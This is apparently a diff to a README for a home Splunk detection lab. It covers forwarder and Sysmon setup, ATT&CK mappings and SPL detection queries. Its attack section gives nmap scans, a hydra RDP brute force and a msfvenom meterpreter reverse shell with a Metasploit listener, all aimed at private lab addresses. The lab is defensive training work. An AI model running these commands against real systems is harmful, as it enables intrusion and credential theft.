@@ -47,7 +47,7 @@ notedown the ip address of windows 2022
 verify connectivity with `ping 10.0.*.*` from Windows.
 
 
-### 2. Install Splunk Enterprise (windows 10 VM machine)
+### 2. Install Splunk Enterprise (windows 2022 VM machine)
 
 -[splunk Enterprise](https://www.splunk.com/en_us/products/splunk-enterprise.html)
 
@@ -55,66 +55,18 @@ Access the Splunk web interface at **http://10.0.*.*:8000**
 
 
 
-### 3. Install Splunk Universal Forwarder (Windows 10)
+### 3. Install Splunk Universal Forwarder IN (Windows 2022)
 
-Download the Windows `.msi` from Splunk and install with default options.
+   Forward Logs to Splunk Enterprise
 
-**`C:\Program Files\SplunkUniversalForwarder\etc\system\local\outputs.conf`**
+### Step 1: Create Configuration File
 
-```ini
-[tcpout]
-defaultGroup = splunk_indexer
+Create a new text file and rename it to `inputs.conf`
 
-[tcpout:splunk_indexer]
-server = 10.0.2.5:9997
-sslVerifyServerCert = false
-```
+### Step 2: Add Configuration
 
-**`C:\Program Files\SplunkUniversalForwarder\etc\system\local\inputs.conf`**
+Open `inputs.conf` in Notepad and paste the following configuration:
 
-```ini
-[WinEventLog://Security]
-disabled = false
-index = endpoint
-
-[WinEventLog://System]
-disabled = false
-index = endpoint
-```
-
-Restart the forwarder service:
-
-```cmd
-net stop SplunkForwarder
-net start SplunkForwarder
-```
-      (OR)
-
-## 3. Forward Logs to Splunk Enterprise
-
-->Step 1: Open Splunk Universal Forwarder Directory
-
-Go to:
-**'C:\Program Files\SplunkUniversalForwarder'**
-
-->Step 2: Navigate to Local Configuration Folder
-
-Open the following folders:
-etc → system → local
-
-Full path:
-C:\Program Files\SplunkUniversalForwarder\etc\system\local
-
-->Step 3: Create inputs.conf
-Inside the local folder:
-Right-click
-Create a new text file
-Rename it as:
-inputs.conf
-
-->Step 4: Add Configuration
-
-Open inputs.conf in Notepad and paste the following configuration:
 ```ini
 [WinEventLog://Application]
 index = endpoint
@@ -134,13 +86,13 @@ disabled = false
 renderXml = true
 ```
 
-->Step 5: Restart Splunk Universal Forwarder
+Restart the forwarder service:
 
-Open Command Prompt as Administrator and run:
-```cmd
+```powershell
 net stop SplunkForwarder
 net start SplunkForwarder
 ```
+      
 
 ->Step 6: Verify Logs in Splunk Enterprise
 
@@ -164,6 +116,7 @@ Download [Sysmon](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmo
 sysmon64 -accepteula -i sysmonconfig.xml
 ```
 
+
 > Use a community config such as [SwiftOnSecurity's sysmonconfig](https://github.com/SwiftOnSecurity/sysmon-config) for comprehensive coverage.
 
 Sysmon events will appear under `Applications and Services Logs → Microsoft → Windows → Sysmon → Operational` and are automatically picked up by the Universal Forwarder.
@@ -177,10 +130,55 @@ Sysmon events will appear under `Applications and Services Logs → Microsoft �
 |--------|----------|--------|-----------------|
 | Nmap Port Scan | T1046 | Discovery (TA0007) | Event ID 5156 — 10+ distinct destination ports from one source in 1 minute |
 | RDP Brute Force | T1110 | Credential Access (TA0006) | Event ID 4625 — 10+ failed logins in 5 minutes via RDP |
-| Reverse Shell (Metasploit) | T1573 | Command & Control (TA0011) | Sysmon Event ID 1 + Event ID 3 — anomalous parent-child process relationships |
 
 ---
 
+
+## Running the Attacks (from Kali Linux)
+
+open bash
+```bash
+sudo apt update
+```
+
+### 1. Port Scan
+
+```bash
+nmap -sT 10.0.2.15    # TCP connect scan
+nmap -sS 10.0.2.15    # SYN scan (requires root)
+nmap -sF 10.0.2.15    # FIN scan (stealth)
+```
+
+### 2. RDP Brute Force
+```bash
+apt install hydra
+```
+
+```bash
+hydra -l Administrator -P /usr/share/wordlists/rockyou.txt rdp://10.0.2.15
+```
+
+### 3. Reverse Shell (Metasploit)
+
+```bash
+# Generate payload
+msfvenom -p windows/x64/meterpreter_reverse_tcp \
+  LHOST=10.0.2.10 LPORT=4444 -f exe -o shell.exe
+
+# Serve the file to Windows
+python3 -m http.server 8080
+
+# Set up listener in msfconsole
+use exploit/multi/handler
+set payload windows/x64/meterpreter_reverse_tcp
+set LHOST 10.0.2.10
+set LPORT 4444
+exploit
+```
+
+Execute `shell.exe` on the Windows target and observe Sysmon events in Splunk.
+
+---
 ## Splunk Detection Queries
 
 ### Port Scan Detection (T1046)
@@ -211,53 +209,7 @@ index=endpoint EventCode=4625 Logon_Type=10
 
 ---
 
-### Reverse Shell Detection (T1573)
 
-```spl
-index=endpoint EventCode=3 Destination_Port > 1024
-    (Image="*\\cmd.exe" OR Image="*\\powershell.exe")
-| table _time, Source_IP, Destination_IP, Destination_Port, Image
-```
-
----
-
-## Running the Attacks (from Kali Linux)
-
-### 1. Port Scan
-
-```bash
-nmap -sT 10.0.2.15    # TCP connect scan
-nmap -sS 10.0.2.15    # SYN scan (requires root)
-nmap -sF 10.0.2.15    # FIN scan (stealth)
-```
-
-### 2. RDP Brute Force
-
-```bash
-hydra -l Administrator -P /usr/share/wordlists/rockyou.txt rdp://10.0.2.15
-```
-
-### 3. Reverse Shell (Metasploit)
-
-```bash
-# Generate payload
-msfvenom -p windows/x64/meterpreter_reverse_tcp \
-  LHOST=10.0.2.10 LPORT=4444 -f exe -o shell.exe
-
-# Serve the file to Windows
-python3 -m http.server 8080
-
-# Set up listener in msfconsole
-use exploit/multi/handler
-set payload windows/x64/meterpreter_reverse_tcp
-set LHOST 10.0.2.10
-set LPORT 4444
-exploit
-```
-
-Execute `shell.exe` on the Windows target and observe Sysmon events in Splunk.
-
----
 
 ## Investigation Dashboard
 
